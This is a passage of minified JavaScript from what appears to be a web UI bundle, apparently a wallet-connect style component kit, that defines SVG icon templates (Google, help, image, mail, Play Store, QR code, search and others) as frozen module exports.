    d="M20.26 12.18a7.1 7.1 0 0 1 4.98 1.93l3.72-3.72A12.47 12.47 0 0 0 20.26 7c-5.08 0-9.47 2.92-11.6 7.17l4.32 3.36a7.76 7.76 0 0 1 7.28-5.35Z"
  />
</svg>`;var JJ=Object.freeze({__proto__:null,googleSvg:ZJ});const QJ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M8.51 5.66a.83.83 0 0 0-.57-.2.83.83 0 0 0-.52.28.8.8 0 0 0-.25.52 1 1 0 0 1-2 0c0-.75.34-1.43.81-1.91a2.75 2.75 0 0 1 4.78 1.92c0 1.24-.8 1.86-1.25 2.2l-.04.03c-.47.36-.5.43-.5.65a1 1 0 1 1-2 0c0-1.25.8-1.86 1.24-2.2l.04-.04c.47-.36.5-.43.5-.65 0-.3-.1-.49-.24-.6ZM9.12 11.87a1.13 1.13 0 1 1-2.25 0 1.13 1.13 0 0 1 2.25 0Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6a6 6 0 1 0 0 12A6 6 0 0 0 8 2Z"
    clip-rule="evenodd"
  />
</svg>`;var YJ=Object.freeze({__proto__:null,helpCircleSvg:QJ});const XJ=re`<svg width="14" height="14" viewBox="0 0 14 14" fill="none">
  <path d="M4.98926 3.73932C4.2989 3.73932 3.73926 4.29896 3.73926 4.98932C3.73926 5.67968 4.2989 6.23932 4.98926 6.23932C5.67962 6.23932 6.23926 5.67968 6.23926 4.98932C6.23926 4.29896 5.67962 3.73932 4.98926 3.73932Z" fill="currentColor"/>
  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.60497 0.500001H6.39504C5.41068 0.499977 4.59185 0.499958 3.93178 0.571471C3.24075 0.64634 2.60613 0.809093 2.04581 1.21619C1.72745 1.44749 1.44749 1.72745 1.21619 2.04581C0.809093 2.60613 0.64634 3.24075 0.571471 3.93178C0.499958 4.59185 0.499977 5.41065 0.500001 6.39501V7.57815C0.499998 8.37476 0.499995 9.05726 0.534869 9.62725C0.570123 10.2034 0.644114 10.7419 0.828442 11.2302C0.925651 11.4877 1.05235 11.7287 1.21619 11.9542C1.44749 12.2726 1.72745 12.5525 2.04581 12.7838C2.60613 13.1909 3.24075 13.3537 3.93178 13.4285C4.59185 13.5001 5.41066 13.5 6.39503 13.5H7.60496C8.58933 13.5 9.40815 13.5001 10.0682 13.4285C10.7593 13.3537 11.3939 13.1909 11.9542 12.7838C12.2726 12.5525 12.5525 12.2726 12.7838 11.9542C13.1909 11.3939 13.3537 10.7593 13.4285 10.0682C13.5 9.40816 13.5 8.58935 13.5 7.60497V6.39505C13.5 5.41068 13.5 4.59185 13.4285 3.93178C13.3537 3.24075 13.1909 2.60613 12.7838 2.04581C12.5525 1.72745 12.2726 1.44749 11.9542 1.21619C11.3939 0.809093 10.7593 0.64634 10.0682 0.571471C9.40816 0.499958 8.58933 0.499977 7.60497 0.500001ZM3.22138 2.83422C3.38394 2.71612 3.62634 2.61627 4.14721 2.55984C4.68679 2.50138 5.39655 2.5 6.45 2.5H7.55C8.60345 2.5 9.31322 2.50138 9.8528 2.55984C10.3737 2.61627 10.6161 2.71612 10.7786 2.83422C10.9272 2.94216 11.0578 3.07281 11.1658 3.22138C11.2839 3.38394 11.3837 3.62634 11.4402 4.14721C11.4986 4.68679 11.5 5.39655 11.5 6.45V6.49703C10.9674 6.11617 10.386 5.84936 9.74213 5.81948C8.40536 5.75745 7.3556 6.73051 6.40509 7.84229C6.33236 7.92737 6.27406 7.98735 6.22971 8.02911L6.1919 8.00514L6.17483 7.99427C6.09523 7.94353 5.98115 7.87083 5.85596 7.80302C5.56887 7.64752 5.18012 7.4921 4.68105 7.4921C4.66697 7.4921 4.6529 7.49239 4.63884 7.49299C3.79163 7.52878 3.09922 8.1106 2.62901 8.55472C2.58751 8.59392 2.54594 8.6339 2.50435 8.6745C2.50011 8.34653 2.5 7.97569 2.5 7.55V6.45C2.5 5.39655 2.50138 4.68679 2.55984 4.14721C2.61627 3.62634 2.71612 3.38394 2.83422 3.22138C2.94216 3.07281 3.07281 2.94216 3.22138 2.83422ZM10.3703 8.14825C10.6798 8.37526 11.043 8.71839 11.4832 9.20889C11.4744 9.44992 11.4608 9.662 11.4402 9.8528C11.3837 10.3737 11.2839 10.6161 11.1658 10.7786C11.0578 10.9272 10.9272 11.0578 10.7786 11.1658C10.6161 11.2839 10.3737 11.3837 9.8528 11.4402C9.31322 11.4986 8.60345 11.5 7.55 11.5H6.45C5.39655 11.5 4.68679 11.4986 4.14721 11.4402C3.62634 11.3837 3.38394 11.2839 3.22138 11.1658C3.15484 11.1174 3.0919 11.0645 3.03298 11.0075C3.10126 10.9356 3.16806 10.8649 3.23317 10.7959L3.29772 10.7276C3.55763 10.4525 3.78639 10.2126 4.00232 10.0087C4.22016 9.80294 4.39412 9.66364 4.53524 9.57742C4.63352 9.51738 4.69022 9.49897 4.71275 9.49345C4.76387 9.49804 4.81803 9.51537 4.90343 9.56162C4.96409 9.59447 5.02355 9.63225 5.11802 9.69238L5.12363 9.69595C5.20522 9.74789 5.32771 9.82587 5.46078 9.89278C5.76529 10.0459 6.21427 10.186 6.74977 10.0158C7.21485 9.86796 7.59367 9.52979 7.92525 9.14195C8.91377 7.98571 9.38267 7.80495 9.64941 7.81733C9.7858 7.82366 10.0101 7.884 10.3703 8.14825Z" fill="currentColor"/>
</svg>`;var eQ=Object.freeze({__proto__:null,imageSvg:XJ});const tQ=re`<svg
 xmlns="http://www.w3.org/2000/svg"
 width="28"
 height="28"
 viewBox="0 0 28 28"
 fill="none">
  <path
    fill="#949E9E"
    fill-rule="evenodd"
    d="M7.974 2.975h12.052c1.248 0 2.296 0 3.143.092.89.096 1.723.307 2.461.844a4.9 4.9 0 0 1 1.084 1.084c.537.738.748 1.57.844 2.461.092.847.092 1.895.092 3.143v6.802c0 1.248 0 2.296-.092 3.143-.096.89-.307 1.723-.844 2.461a4.9 4.9 0 0 1-1.084 1.084c-.738.537-1.57.748-2.461.844-.847.092-1.895.092-3.143.092H7.974c-1.247 0-2.296 0-3.143-.092-.89-.096-1.723-.307-2.461-.844a4.901 4.901 0 0 1-1.084-1.084c-.537-.738-.748-1.571-.844-2.461C.35 19.697.35 18.649.35 17.4v-6.802c0-1.248 0-2.296.092-3.143.096-.89.307-1.723.844-2.461A4.9 4.9 0 0 1 2.37 3.91c.738-.537 1.571-.748 2.461-.844.847-.092 1.895-.092 3.143-.092ZM5.133 5.85c-.652.071-.936.194-1.117.326a2.1 2.1 0 0 0-.465.465c-.132.181-.255.465-.325 1.117-.074.678-.076 1.573-.076 2.917v6.65c0 1.344.002 2.239.076 2.917.07.652.193.936.325 1.117a2.1 2.1 0 0 0 .465.465c.181.132.465.255 1.117.326.678.073 1.574.075 2.917.075h11.9c1.344 0 2.239-.002 2.917-.075.652-.071.936-.194 1.117-.326.179-.13.335-.286.465-.465.132-.181.255-.465.326-1.117.073-.678.075-1.573.075-2.917v-6.65c0-1.344-.002-2.239-.075-2.917-.071-.652-.194-.936-.326-1.117a2.1 2.1 0 0 0-.465-.465c-.181-.132-.465-.255-1.117-.326-.678-.073-1.573-.075-2.917-.075H8.05c-1.343 0-2.239.002-2.917.075Zm.467 7.275a3.15 3.15 0 1 1 6.3 0 3.15 3.15 0 0 1-6.3 0Zm8.75-1.75a1.4 1.4 0 0 1 1.4-1.4h3.5a1.4 1.4 0 0 1 0 2.8h-3.5a1.4 1.4 0 0 1-1.4-1.4Zm0 5.25a1.4 1.4 0 0 1 1.4-1.4H21a1.4 1.4 0 1 1 0 2.8h-5.25a1.4 1.4 0 0 1-1.4-1.4Z"
    clip-rule="evenodd"/>
</svg>`;var rQ=Object.freeze({__proto__:null,idSvg:tQ});const nQ=re`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    d="M6 10.49a1 1 0 1 0 2 0v-2a1 1 0 0 0-2 0v2ZM7 4.49a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 14.99a7 7 0 1 0 0-14 7 7 0 0 0 0 14Zm5-7a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"
    clip-rule="evenodd"
  />
</svg>`;var iQ=Object.freeze({__proto__:null,infoCircleSvg:nQ});const sQ=re`<svg width="10" height="10" viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M5.00177 1.78569C3.8179 1.78569 2.85819 2.74508 2.85819 3.92855C2.85819 4.52287 3.09928 5.05956 3.49077 5.4485L3.5005 5.45817C3.64381 5.60054 3.76515 5.72108 3.85631 5.81845C3.93747 5.90512 4.05255 6.03218 4.12889 6.1805C4.16999 6.26034 4.19 6.30843 4.21768 6.39385C4.22145 6.40546 4.22499 6.41703 4.22833 6.42855H5.77521C5.77854 6.41703 5.78208 6.40547 5.78585 6.39385C5.81353 6.30843 5.83354 6.26034 5.87464 6.1805C5.95098 6.03218 6.06606 5.90512 6.14722 5.81845C6.23839 5.72108 6.35973 5.60053 6.50304 5.45816L6.51276 5.4485C6.90425 5.05956 7.14534 4.52287 7.14534 3.92855C7.14534 2.74508 6.18563 1.78569 5.00177 1.78569ZM5.71629 7.85712H4.28724C4.28724 8.21403 4.28876 8.40985 4.30703 8.54571C4.30727 8.54748 4.30751 8.54921 4.30774 8.55091C4.30944 8.55115 4.31118 8.55138 4.31295 8.55162C4.44884 8.56989 4.64474 8.5714 5.00177 8.5714C5.3588 8.5714 5.55469 8.56989 5.69059 8.55162C5.69236 8.55138 5.69409 8.55115 5.69579 8.55091C5.69603 8.54921 5.69627 8.54748 5.6965 8.54571C5.71477 8.40985 5.71629 8.21403 5.71629 7.85712ZM2.85819 7.14283C2.85819 6.9948 2.85796 6.91114 2.8548 6.85032C2.85461 6.84656 2.85441 6.84309 2.85421 6.83988C2.84393 6.8282 2.83047 6.81334 2.81301 6.79469C2.74172 6.71856 2.63908 6.61643 2.48342 6.46178C1.83307 5.81566 1.42914 4.91859 1.42914 3.92855C1.42914 1.9561 3.02866 0.357117 5.00177 0.357117C6.97487 0.357117 8.57439 1.9561 8.57439 3.92855C8.57439 4.91859 8.17047 5.81566 7.52012 6.46178C7.36445 6.61643 7.26182 6.71856 7.19053 6.79469C7.17306 6.81334 7.1596 6.8282 7.14932 6.83988C7.14912 6.84309 7.14892 6.84656 7.14873 6.85032C7.14557 6.91114 7.14534 6.9948 7.14534 7.14283V7.85712C7.14534 7.87009 7.14535 7.88304 7.14535 7.89598C7.14541 8.19889 7.14547 8.49326 7.11281 8.73606C7.076 9.00978 6.98631 9.32212 6.72678 9.58156C6.46726 9.841 6.15481 9.93065 5.881 9.96745C5.63813 10.0001 5.34365 10 5.04064 9.99998C5.0277 9.99998 5.01474 9.99998 5.00177 9.99998C4.98879 9.99998 4.97583 9.99998 4.96289 9.99998C4.65988 10 4.36541 10.0001 4.12253 9.96745C3.84872 9.93065 3.53628 9.841 3.27675 9.58156C3.01722 9.32212 2.92753 9.00978 2.89072 8.73606C2.85807 8.49326 2.85812 8.19889 2.85818 7.89598C2.85819 7.88304 2.85819 7.87008 2.85819 7.85712V7.14283ZM7.1243 6.86977C7.12366 6.87069 7.1233 6.87116 7.12327 6.87119C7.12323 6.87123 7.12356 6.87076 7.1243 6.86977ZM2.88027 6.8712C2.88025 6.87119 2.87988 6.8707 2.87921 6.86975C2.87995 6.87072 2.88028 6.8712 2.88027 6.8712Z" fill="#949E9E"/>
</svg>`;var oQ=Object.freeze({__proto__:null,lightbulbSvg:sQ});const aQ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.83 1.34h6.34c.68 0 1.26 0 1.73.04.5.05.97.15 1.42.4.52.3.95.72 1.24 1.24.26.45.35.92.4 1.42.04.47.04 1.05.04 1.73v3.71c0 .69 0 1.26-.04 1.74-.05.5-.14.97-.4 1.41-.3.52-.72.95-1.24 1.25-.45.25-.92.35-1.42.4-.47.03-1.05.03-1.73.03H4.83c-.68 0-1.26 0-1.73-.04-.5-.04-.97-.14-1.42-.4-.52-.29-.95-.72-1.24-1.24a3.39 3.39 0 0 1-.4-1.41A20.9 20.9 0 0 1 0 9.88v-3.7c0-.7 0-1.27.04-1.74.05-.5.14-.97.4-1.42.3-.52.72-.95 1.24-1.24.45-.25.92-.35 1.42-.4.47-.04 1.05-.04 1.73-.04ZM3.28 3.38c-.36.03-.51.08-.6.14-.21.11-.39.29-.5.5a.8.8 0 0 0-.08.19l5.16 3.44c.45.3 1.03.3 1.48 0L13.9 4.2a.79.79 0 0 0-.08-.2c-.11-.2-.29-.38-.5-.5-.09-.05-.24-.1-.6-.13-.37-.04-.86-.04-1.6-.04H4.88c-.73 0-1.22 0-1.6.04ZM14 6.54 9.85 9.31a3.33 3.33 0 0 1-3.7 0L2 6.54v3.3c0 .74 0 1.22.03 1.6.04.36.1.5.15.6.11.2.29.38.5.5.09.05.24.1.6.14.37.03.86.03 1.6.03h6.25c.73 0 1.22 0 1.6-.03.35-.03.5-.09.6-.14.2-.12.38-.3.5-.5.05-.1.1-.24.14-.6.03-.38.03-.86.03-1.6v-3.3Z"
    clip-rule="evenodd"
  />
</svg>`;var cQ=Object.freeze({__proto__:null,mailSvg:aQ});const lQ=re`<svg fill="none" viewBox="0 0 20 20">
  <path fill="currentColor" d="M10.81 5.81a2 2 0 1 1-4 0 2 2 0 0 1 4 0Z" />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3 4.75A4.75 4.75 0 0 1 7.75 0h4.5A4.75 4.75 0 0 1 17 4.75v10.5A4.75 4.75 0 0 1 12.25 20h-4.5A4.75 4.75 0 0 1 3 15.25V4.75ZM7.75 2A2.75 2.75 0 0 0 5 4.75v10.5A2.75 2.75 0 0 0 7.75 18h4.5A2.75 2.75 0 0 0 15 15.25V4.75A2.75 2.75 0 0 0 12.25 2h-4.5Z"
    clip-rule="evenodd"
  />
</svg>`;var uQ=Object.freeze({__proto__:null,mobileSvg:lQ});const hQ=re`<svg fill="none" viewBox="0 0 41 40">
  <path
    style="fill: var(--wui-color-fg-100);"
    fill-opacity=".05"
    d="M.6 20a20 20 0 1 1 40 0 20 20 0 0 1-40 0Z"
  />
  <path
    fill="#949E9E"
    d="M15.6 20.31a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0ZM23.1 20.31a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0ZM28.1 22.81a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z"
  />
</svg>`;var dQ=Object.freeze({__proto__:null,moreSvg:hQ});const fQ=re`<svg fill="none" viewBox="0 0 22 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M16.32 13.62a3.14 3.14 0 1 1-.99 1.72l-1.6-.93a3.83 3.83 0 0 1-3.71 1 3.66 3.66 0 0 1-1.74-1l-1.6.94a3.14 3.14 0 1 1-1-1.73l1.6-.94a3.7 3.7 0 0 1 0-2 3.81 3.81 0 0 1 1.8-2.33c.29-.17.6-.3.92-.38V6.1a3.14 3.14 0 1 1 2 0l-.01.02v1.85H12a3.82 3.82 0 0 1 2.33 1.8 3.7 3.7 0 0 1 .39 2.91l1.6.93ZM2.6 16.54a1.14 1.14 0 0 0 1.98-1.14 1.14 1.14 0 0 0-1.98 1.14ZM11 2.01a1.14 1.14 0 1 0 0 2.28 1.14 1.14 0 0 0 0-2.28Zm1.68 10.45c.08-.19.14-.38.16-.58v-.05l.02-.13v-.13a1.92 1.92 0 0 0-.24-.8l-.11-.15a1.89 1.89 0 0 0-.74-.6 1.86 1.86 0 0 0-.77-.17h-.19a1.97 1.97 0 0 0-.89.34 1.98 1.98 0 0 0-.61.74 1.99 1.99 0 0 0-.16.9v.05a1.87 1.87 0 0 0 .24.74l.1.15c.12.16.26.3.42.42l.16.1.13.07.04.02a1.84 1.84 0 0 0 .76.17h.17a2 2 0 0 0 .91-.35 1.78 1.78 0 0 0 .52-.58l.03-.05a.84.84 0 0 0 .05-.11Zm5.15 4.5a1.14 1.14 0 0 0 1.14-1.97 1.13 1.13 0 0 0-1.55.41c-.32.55-.13 1.25.41 1.56Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.63 9.43a1.5 1.5 0 1 0 1.5-2.6 1.5 1.5 0 0 0-1.5 2.6Zm.32-1.55a.5.5 0 0 1 .68-.19.5.5 0 0 1 .18.68.5.5 0 0 1-.68.19.5.5 0 0 1-.18-.68ZM17.94 8.88a1.5 1.5 0 1 1-2.6-1.5 1.5 1.5 0 1 1 2.6 1.5ZM16.9 7.69a.5.5 0 0 0-.68.19.5.5 0 0 0 .18.68.5.5 0 0 0 .68-.19.5.5 0 0 0-.18-.68ZM9.75 17.75a1.5 1.5 0 1 1 2.6 1.5 1.5 1.5 0 1 1-2.6-1.5Zm1.05 1.18a.5.5 0 0 0 .68-.18.5.5 0 0 0-.18-.68.5.5 0 0 0-.68.18.5.5 0 0 0 .18.68Z"
    clip-rule="evenodd"
  />
</svg>`;var pQ=Object.freeze({__proto__:null,networkPlaceholderSvg:fQ});const gQ=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.13 1h1.71c1.46 0 2.63 0 3.56.1.97.1 1.8.33 2.53.85a5 5 0 0 1 1.1 1.11c.53.73.75 1.56.86 2.53.1.93.1 2.1.1 3.55v1.72c0 1.45 0 2.62-.1 3.55-.1.97-.33 1.8-.86 2.53a5 5 0 0 1-1.1 1.1c-.73.53-1.56.75-2.53.86-.93.1-2.1.1-3.55.1H9.13c-1.45 0-2.62 0-3.56-.1-.96-.1-1.8-.33-2.52-.85a5 5 0 0 1-1.1-1.11 5.05 5.05 0 0 1-.86-2.53c-.1-.93-.1-2.1-.1-3.55V9.14c0-1.45 0-2.62.1-3.55.1-.97.33-1.8.85-2.53a5 5 0 0 1 1.1-1.1 5.05 5.05 0 0 1 2.53-.86C6.51 1 7.67 1 9.13 1ZM5.79 3.09a3.1 3.1 0 0 0-1.57.48 3 3 0 0 0-.66.67c-.24.32-.4.77-.48 1.56-.1.82-.1 1.88-.1 3.4v1.6c0 1.15 0 2.04.05 2.76l.41-.42c.5-.5.93-.92 1.32-1.24.41-.33.86-.6 1.43-.7a3 3 0 0 1 .94 0c.35.06.66.2.95.37a17.11 17.11 0 0 0 .8.45c.1-.08.2-.2.41-.4l.04-.03a27 27 0 0 1 1.95-1.84 4.03 4.03 0 0 1 1.91-.94 4 4 0 0 1 1.25 0c.73.11 1.33.46 1.91.94l.64.55V9.2c0-1.52 0-2.58-.1-3.4a3.1 3.1 0 0 0-.48-1.56 3 3 0 0 0-.66-.67 3.1 3.1 0 0 0-1.56-.48C13.37 3 12.3 3 10.79 3h-1.6c-1.52 0-2.59 0-3.4.09Zm11.18 10-.04-.05a26.24 26.24 0 0 0-1.83-1.74c-.45-.36-.73-.48-.97-.52a2 2 0 0 0-.63 0c-.24.04-.51.16-.97.52-.46.38-1.01.93-1.83 1.74l-.02.02c-.17.18-.34.34-.49.47a2.04 2.04 0 0 1-1.08.5 1.97 1.97 0 0 1-1.25-.27l-.79-.46-.02-.02a.65.65 0 0 0-.24-.1 1 1 0 0 0-.31 0c-.08.02-.21.06-.49.28-.3.24-.65.59-1.2 1.14l-.56.56-.65.66a3 3 0 0 0 .62.6c.33.24.77.4 1.57.49.81.09 1.88.09 3.4.09h1.6c1.52 0 2.58 0 3.4-.09a3.1 3.1 0 0 0 1.56-.48 3 3 0 0 0 .66-.67c.24-.32.4-.77.49-1.56l.07-1.12Zm-8.02-1.03ZM4.99 7a2 2 0 1 1 4 0 2 2 0 0 1-4 0Z"
    clip-rule="evenodd"
  />
</svg>`;var wQ=Object.freeze({__proto__:null,nftPlaceholderSvg:gQ});const mQ=re`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 0a1 1 0 0 1 1 1v5.38a1 1 0 0 1-2 0V1a1 1 0 0 1 1-1ZM5.26 2.6a1 1 0 0 1-.28 1.39 5.46 5.46 0 1 0 6.04 0 1 1 0 1 1 1.1-1.67 7.46 7.46 0 1 1-8.25 0 1 1 0 0 1 1.4.28Z"
    clip-rule="evenodd"
  />
</svg>`;var yQ=Object.freeze({__proto__:null,offSvg:mQ});const bQ=re` <svg
  width="36"
  height="36"
  fill="none"
>
  <path
    d="M0 8a8 8 0 0 1 8-8h20a8 8 0 0 1 8 8v20a8 8 0 0 1-8 8H8a8 8 0 0 1-8-8V8Z"
    fill="#fff"
    fill-opacity=".05"
  />
  <path
    d="m18.262 17.513-8.944 9.49v.01a2.417 2.417 0 0 0 3.56 1.452l.026-.017 10.061-5.803-4.703-5.132Z"
    fill="#EA4335"
  />
  <path
    d="m27.307 15.9-.008-.008-4.342-2.52-4.896 4.36 4.913 4.912 4.325-2.494a2.42 2.42 0 0 0 .008-4.25Z"
    fill="#FBBC04"
  />
  <path
    d="M9.318 8.997c-.05.202-.084.403-.084.622V26.39c0 .218.025.42.084.621l9.246-9.247-9.246-8.768Z"
    fill="#4285F4"
  />
  <path
    d="m18.33 18 4.627-4.628-10.053-5.828a2.427 2.427 0 0 0-3.586 1.444L18.329 18Z"
    fill="#34A853"
  />
  <path
    d="M8 .5h20A7.5 7.5 0 0 1 35.5 8v20a7.5 7.5 0 0 1-7.5 7.5H8A7.5 7.5 0 0 1 .5 28V8A7.5 7.5 0 0 1 8 .5Z"
    stroke="#fff"
    stroke-opacity=".05"
  />
</svg>`;var vQ=Object.freeze({__proto__:null,playStoreSvg:bQ});const EQ=re`<svg
  width="13"
  height="12"
  viewBox="0 0 13 12"
  fill="none"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M0.794373 5.99982C0.794373 5.52643 1.17812 5.14268 1.6515 5.14268H5.643V1.15109C5.643 0.677701 6.02675 0.293946 6.50012 0.293945C6.9735 0.293946 7.35725 0.677701 7.35725 1.15109V5.14268H11.3488C11.8221 5.14268 12.2059 5.52643 12.2059 5.99982C12.2059 6.47321 11.8221 6.85696 11.3488 6.85696H7.35725V10.8486C7.35725 11.3219 6.9735 11.7057 6.50012 11.7057C6.02675 11.7057 5.643 11.3219 5.643 10.8486V6.85696H1.6515C1.17812 6.85696 0.794373 6.47321 0.794373 5.99982Z"
  /></svg
>`;var CQ=Object.freeze({__proto__:null,plusSvg:EQ});const AQ=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M3 6a3 3 0 0 1 3-3h1a1 1 0 1 0 0-2H6a5 5 0 0 0-5 5v1a1 1 0 0 0 2 0V6ZM13 1a1 1 0 1 0 0 2h1a3 3 0 0 1 3 3v1a1 1 0 1 0 2 0V6a5 5 0 0 0-5-5h-1ZM3 13a1 1 0 1 0-2 0v1a5 5 0 0 0 5 5h1a1 1 0 1 0 0-2H6a3 3 0 0 1-3-3v-1ZM19 13a1 1 0 1 0-2 0v1a3 3 0 0 1-3 3h-1a1 1 0 1 0 0 2h1.01a5 5 0 0 0 5-5v-1ZM5.3 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05A1.5 1.5 0 0 0 9.2 8.14c.06-.2.06-.43.06-.89s0-.7-.06-.89A1.5 1.5 0 0 0 8.14 5.3c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM10.8 6.36c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06ZM5.26 12.75c0-.46 0-.7.05-.89a1.5 1.5 0 0 1 1.06-1.06c.19-.05.42-.05.89-.05.46 0 .7 0 .88.05.52.14.93.54 1.06 1.06.06.2.06.43.06.89s0 .7-.06.89a1.5 1.5 0 0 1-1.06 1.06c-.19.05-.42.05-.88.05-.47 0-.7 0-.9-.05a1.5 1.5 0 0 1-1.05-1.06c-.05-.2-.05-.43-.05-.89ZM10.8 11.86c-.04.2-.04.43-.04.89s0 .7.05.89c.14.52.54.92 1.06 1.06.19.05.42.05.89.05.46 0 .7 0 .88-.05a1.5 1.5 0 0 0 1.06-1.06c.06-.2.06-.43.06-.89s0-.7-.06-.89a1.5 1.5 0 0 0-1.06-1.06c-.19-.05-.42-.05-.88-.05-.47 0-.7 0-.9.05a1.5 1.5 0 0 0-1.05 1.06Z"
  />
</svg>`;var xQ=Object.freeze({__proto__:null,qrCodeIcon:AQ});const IQ=re`<svg
  fill="none"
  viewBox="0 0 21 20"
>
  <path
    fill="currentColor"
    d="M8.8071 0.292893C9.19763 0.683417 9.19763 1.31658 8.8071 1.70711L6.91421 3.6H11.8404C14.3368 3.6 16.5533 5.1975 17.3427 7.56588L17.4487 7.88377C17.6233 8.40772 17.3402 8.97404 16.8162 9.14868C16.2923 9.32333 15.726 9.04017 15.5513 8.51623L15.4453 8.19834C14.9281 6.64664 13.476 5.6 11.8404 5.6H6.91421L8.8071 7.49289C9.19763 7.88342 9.19763 8.51658 8.8071 8.90711C8.41658 9.29763 7.78341 9.29763 7.39289 8.90711L3.79289 5.30711C3.40236 4.91658 3.40236 4.28342 3.79289 3.89289L7.39289 0.292893C7.78341 -0.0976311 8.41658 -0.0976311 8.8071 0.292893ZM4.18377 10.8513C4.70771 10.6767 5.27403 10.9598 5.44868 11.4838L5.55464 11.8017C6.07188 13.3534 7.52401 14.4 9.15964 14.4L14.0858 14.4L12.1929 12.5071C11.8024 12.1166 11.8024 11.4834 12.1929 11.0929C12.5834 10.7024 13.2166 10.7024 13.6071 11.0929L17.2071 14.6929C17.5976 15.0834 17.5976 15.7166 17.2071 16.1071L13.6071 19.7071C13.2166 20.0976 12.5834 20.0976 12.1929 19.7071C11.8024 19.3166 11.8024 18.6834 12.1929 18.2929L14.0858 16.4L9.15964 16.4C6.66314 16.4 4.44674 14.8025 3.65728 12.4341L3.55131 12.1162C3.37667 11.5923 3.65983 11.026 4.18377 10.8513Z"
  /></svg
>`;var SQ=Object.freeze({__proto__:null,recycleHorizontalSvg:IQ});const NQ=re`<svg fill="none" viewBox="0 0 14 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.94 1.04a1 1 0 0 1 .7 1.23l-.48 1.68a5.85 5.85 0 0 1 8.53 4.32 5.86 5.86 0 0 1-11.4 2.56 1 1 0 0 1 1.9-.57 3.86 3.86 0 1 0 1.83-4.5l1.87.53a1 1 0 0 1-.55 1.92l-4.1-1.15a1 1 0 0 1-.69-1.23l1.16-4.1a1 1 0 0 1 1.23-.7Z"
    clip-rule="evenodd"
  />
</svg>`;var PQ=Object.freeze({__proto__:null,refreshSvg:NQ});const kQ=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.36 4.21a5.14 5.14 0 1 0 0 10.29 5.14 5.14 0 0 0 0-10.29ZM1.64 9.36a7.71 7.71 0 1 1 14 4.47l2.52 2.5a1.29 1.29 0 1 1-1.82 1.83l-2.51-2.51A7.71 7.71 0 0 1 1.65 9.36Z"
    clip-rule="evenodd"
  />
</svg>`;var OQ=Object.freeze({__proto__:null,searchSvg:kQ});const _Q=re`<svg fill="none" viewBox="0 0 21 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M14.3808 4.34812C13.72 4.47798 12.8501 4.7587 11.5748 5.17296L9.00869 6.00646C6.90631 6.68935 5.40679 7.17779 4.38121 7.63178C3.87166 7.85734 3.5351 8.05091 3.32022 8.22035C3.11183 8.38466 3.07011 8.48486 3.05969 8.51817C2.98058 8.77103 2.98009 9.04195 3.05831 9.29509C3.06861 9.32844 3.10998 9.42878 3.31777 9.59384C3.53205 9.76404 3.86792 9.95881 4.37667 10.1862C5.29287 10.5957 6.58844 11.0341 8.35529 11.6164L10.8876 8.59854C11.2426 8.17547 11.8733 8.12028 12.2964 8.47528C12.7195 8.83029 12.7746 9.46104 12.4196 9.88412L9.88738 12.9019C10.7676 14.5408 11.4244 15.7406 11.9867 16.5718C12.299 17.0333 12.5491 17.3303 12.7539 17.5117C12.9526 17.6877 13.0586 17.711 13.0932 17.7154C13.3561 17.7484 13.6228 17.7009 13.8581 17.5791C13.8891 17.563 13.9805 17.5046 14.1061 17.2708C14.2357 17.0298 14.3679 16.6647 14.5015 16.1237C14.7705 15.0349 14.9912 13.4733 15.2986 11.2843L15.6738 8.61249C15.8603 7.28456 15.9857 6.37917 15.9989 5.7059C16.012 5.03702 15.9047 4.8056 15.8145 4.69183C15.7044 4.55297 15.5673 4.43792 15.4114 4.35365C15.2837 4.28459 15.0372 4.2191 14.3808 4.34812ZM7.99373 13.603C6.11919 12.9864 4.6304 12.4902 3.5606 12.0121C2.98683 11.7557 2.4778 11.4808 2.07383 11.1599C1.66337 10.8339 1.31312 10.4217 1.14744 9.88551C0.949667 9.24541 0.950886 8.56035 1.15094 7.92096C1.31852 7.38534 1.67024 6.97442 2.08185 6.64985C2.48697 6.33041 2.99697 6.05734 3.57166 5.80295C4.70309 5.3021 6.30179 4.78283 8.32903 4.12437L11.0196 3.25042C12.2166 2.86159 13.2017 2.54158 13.9951 2.38566C14.8065 2.22618 15.6202 2.19289 16.3627 2.59437C16.7568 2.80747 